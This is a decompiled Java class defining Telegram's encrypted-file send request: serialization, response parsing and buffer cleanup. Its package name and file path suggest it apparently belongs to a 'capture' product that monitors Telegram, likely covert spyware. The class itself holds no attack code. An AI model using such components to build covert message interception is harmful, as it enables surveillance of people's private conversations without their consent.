package com.vvt.capture.telegram.internal;

public class TLRPC$TL_messages_sendEncryptedFile
  extends TLObject
{
  public static int constructor = -1701831834;
  public NativeByteBuffer data;
  public TLRPC.InputEncryptedFile file;
  public TLRPC.TL_inputEncryptedChat peer;
  public long random_id;
  
  public TLObject deserializeResponse(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    return TLRPC.messages_SentEncryptedMessage.TLdeserialize(paramAbstractSerializedData, paramInt, paramBoolean);
  }
  
  public void freeResources()
  {
    NativeByteBuffer localNativeByteBuffer = this.data;
    if (localNativeByteBuffer != null)
    {
      this.data.reuse();
      localNativeByteBuffer = null;
      this.data = null;
    }
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    this.peer.serializeToStream(paramAbstractSerializedData);
    long l = this.random_id;
    paramAbstractSerializedData.writeInt64(l);
    NativeByteBuffer localNativeByteBuffer = this.data;
    paramAbstractSerializedData.writeByteBuffer(localNativeByteBuffer);
    this.file.serializeToStream(paramAbstractSerializedData);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_messages_sendEncryptedFile.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */